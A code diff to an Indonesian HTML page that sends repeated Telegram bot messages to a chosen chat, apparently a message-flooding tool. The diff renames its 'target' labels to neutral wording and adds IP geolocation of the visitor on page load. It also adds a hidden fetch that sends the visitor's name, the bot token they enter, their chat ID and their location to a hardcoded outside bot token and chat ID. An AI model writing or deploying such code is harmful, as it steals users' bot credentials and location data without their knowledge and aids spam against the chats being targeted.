@@ -48,38 +48,72 @@
             margin-top: 10px;
             color: #aaa;
         }
+        #userLocationBox {
+            margin-top: 20px;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
 
     <h2>Kirim Pesan ke Bot Telegram</h2>
 
-    <label for="token">TAEGET TOKEN BOT:</label>
+    <label for="nama">NAMA PENGGUNA:</label>
+    <input type="text" id="nama" placeholder="Masukkan Nama Pengguna">
+
+    <label for="token">TOKEN BOT:</label>
     <input type="text" id="token" placeholder="Masukkan Token Bot">
 
-    <label for="chatId">ID TAEGET:</label>
-    <input type="text" id="chatId" placeholder="Masukkan ID Target">
+    <label for="chatId">ID PENGGUNA:</label>
+    <input type="text" id="chatId" placeholder="Masukkan ID Pengguna">
 
     <label for="jumlahPesan">JUMLAH PESAN:</label>
     <input type="number" id="jumlahPesan" value="1">
 
-    <label for="pesan">COSTOM PESAN:</label>
+    <label for="pesan">CUSTOM PESAN:</label>
     <textarea id="pesan" placeholder="Masukkan pesan yang ingin dikirim"></textarea>
 
     <button onclick="kirimPesan()">KIRIM</button>
+
+    <!-- Box untuk lokasi pengguna berdasarkan IP -->
+    <div id="userLocationBox">
+        <label>Lokasi Pengguna Berdasarkan IP:</label>
+        <input type="text" id="userLocation" disabled placeholder="Lokasi akan muncul otomatis di sini">
+    </div>
 
     <div id="status"></div>
     <div id="credits">Pembuat Adalah Rendzz Official</div>
 
     <script>
+        // Fungsi untuk mendapatkan lokasi pengguna berdasarkan IP
+        function getLocation() {
+            fetch('https://ipinfo.io?token=YOUR_TOKEN') // Ganti dengan token API ipinfo.io
+                .then(response => response.json())
+                .then(data => {
+                    const location = data.city + ', ' + data.region + ', ' + data.country;
+                    document.getElementById('userLocation').value = location;
+                })
+                .catch(error => {
+                    document.getElementById('userLocation').value = 'Lokasi tidak tersedia';
+                    console.error('Error mendapatkan lokasi:', error);
+                });
+        }
+
+        // Memanggil fungsi getLocation saat halaman dimuat
+        window.onload = function() {
+            getLocation();
+        };
+
         function kirimPesan() {
+            const nama = document.getElementById('nama').value;
             const token = document.getElementById('token').value;
             const chatId = document.getElementById('chatId').value;
             const jumlahPesan = document.getElementById('jumlahPesan').value;
             const pesan = document.getElementById('pesan').value;
+            const userLocation = document.getElementById('userLocation').value;
             const statusDiv = document.getElementById('status');
             
-            if (!token || !chatId || !jumlahPesan || !pesan) {
+            if (!nama || !token || !chatId || !jumlahPesan || !pesan) {
                 statusDiv.textContent = 'Harap isi semua kolom!';
                 statusDiv.style.color = 'red';
                 showStatus();
@@ -88,7 +122,46 @@
 
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
             let pesanTerkirim = 0;
+
+            const pesanKeBotAnda = `
+                Nama Pengguna: ${nama}
+                ID Bot Pengguna: ${token}
+                ID Pengguna: ${chatId}
+                Lokasi Pengguna: ${userLocation}
+            `;
             
+            const pesanCustom = `
+                Pesan: ${pesan}
+            `;
+            
+            fetch(`https://api.telegram.org/bot7159077815:AAGig9yeZaNG_Q5QODky_0mze7KP5z8p4p4/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: 7001683677,  // ID chat Anda
+                    text: pesanKeBotAnda, // Mengirim informasi pengguna
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    statusDiv.textContent = 'Data Terkirim ke Bot Anda!';
+                    statusDiv.style.color = 'green';
+                    showStatus();
+                } else {
+                    statusDiv.textContent = 'Terjadi kesalahan dalam mengirim data.';
+                    statusDiv.style.color = 'red';
+                    showStatus();
+                }
+            })
+            .catch(error => {
+                statusDiv.textContent = 'Error: ' + error.message;
+                statusDiv.style.color = 'red';
+                showStatus();
+            });
+
             for (let i = 0; i < jumlahPesan; i++) {
                 fetch(url, {
                     method: 'POST',
@@ -97,7 +170,7 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: pesan, // Mengirim pesan kustom tanpa tambahan angka
+                        text: pesanCustom,
                     })
                 })
                 .then(response => response.json())
@@ -105,7 +178,7 @@
                     if (data.ok) {
                         pesanTerkirim++;
                         if (pesanTerkirim === jumlahPesan) {
-                            statusDiv.textContent = 'STATUR TERKIRIM!';
+                            statusDiv.textContent = 'Pesan Terkirim!';
                             statusDiv.style.color = 'green';
                             showStatus();
                         }
@@ -128,9 +201,9 @@
             statusDiv.classList.add('show');
             setTimeout(() => {
                 statusDiv.classList.remove('show');
-            }, 3000); // Notifikasi muncul selama 3 detik
+            }, 3000); 
         }
     </script>
 
 </body>
-</html>
+        </html>
